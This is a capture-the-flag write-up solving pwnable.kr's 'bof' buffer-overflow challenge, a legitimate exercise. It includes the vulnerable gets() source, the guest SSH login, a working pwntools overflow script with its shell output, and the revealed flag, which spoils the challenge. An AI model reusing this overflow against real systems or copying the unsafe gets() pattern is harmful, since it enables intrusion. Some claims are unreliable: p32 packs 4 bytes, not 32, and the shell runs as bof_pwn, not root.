# URL
https://pwnable.kr/play.php

# SSH COMMAND
ssh bof@pwnable.kr -p2222 (pw: guest)

# Source Code
  ```
    #include <stdio.h>
    #include <string.h>
    #include <stdlib.h>
    void func(int key){
    	char overflowme[32];
    	printf("overflow me : ");
    	gets(overflowme);	// smash me!
    	if(key == 0xcafebabe){
    		setregid(getegid(), getegid());
    		system("/bin/sh");
    	}
    	else{
    		printf("Nah..\n");
    	}
    }
    int main(int argc, char* argv[]){
    	func(0xdeadbeef);
    	return 0;
    }
  ```

# Concept 
To understand what buffer means and how Buffer Overflow occurs and how can it be exploited 

# Method of Solve
- Login using the ssh credentials
- perform listing to list all the files and folders present in the directory
- perform cat operation to see the code of bof.c
- run it in gdb for debugging and looking for the actual buffer size ... here 52 Bytes and then the 0xdeadbeef was written in the buffer
- once we found the actual size, read the readme file i.e. cat readme
- You will see nc 0 9000 is holding the flag
- This means that we firdt have to have a ssh shell and insidde the shell we need to have a netcat listener and shell to get the flag
- So in our linux terminal lets code for overflowing buffer using pwntools
    ```
      from pwn import *

      context.arch = 'i386'
      
      s = ssh(
          user='bof',
          host='pwnable.kr',
          port=2222,
          password='guest'
      )
    
      p = s.run('nc 0 9000')
      
      payload = b"A"*52 + p32(0xcafebabe)
      p.sendline(payload)
      
      p.interactive()
    ```
- this is the code for the exploit. I named it **exploit.py**
- In the code we are first importing the pwntools using from pwn import *
- Then we are writing the architecture compositions of the OS on which our ssh shell is actually runnning (not our own linux)
- Then we are connecting to the shell using ssh
- Then inside the shell we are createing a pseudoshell by running nc locally
- Then we are passsing our actual payload to overflow the buffer by sending A 52 times first in bytes format and then sending a packet of 32 bytes in endian format for memory 0xcafebabe
- As we saw in source code, the func is actually using gets and if we **man gets** we get that gets performs string operations in 1 line at a time
- So we send our payload as a line to our pseudoshell created by nc
- finally we run the shell in an interactive mode to execute commands such as cat to get the flag
    ```
      ─$ python3 exploit.py
        [+] Connecting to pwnable.kr on port 2222: Done
        [*] bof@pwnable.kr:
            Distro    Ubuntu 22.04
            OS:       linux
            Arch:     amd64
            Version:  5.15.0
            ASLR:     Enabled
            SHSTK:    Disabled
            IBT:      Disabled
        [+] Opening new channel: 'nc 0 9000': Done
        [*] Switching to interactive mode
    ```
- As we can see we get an interactive mode
    ```
      bof@ubuntu:~$ id
      uid=1003(bof) gid=1003(bof) groups=1003(bof)
    ```
- This is our id before the running the script
    ```
      $ id
      uid=1008(bof_pwn) gid=1008(bof_pwn) groups=1008(bof_pwn)
    ```
- This is our id after connecting through the exploit script i.e we become root
- Now we can simply cat the file flag
    ```
      $ ls
      bof
      bof.c
      flag
      log
      super.pl
      $ cat flag
      Daddy_I_just_pwned_a_buff3r!
    ```
- The Flag is **Daddy_I_just_pwned_a_buff3r!**
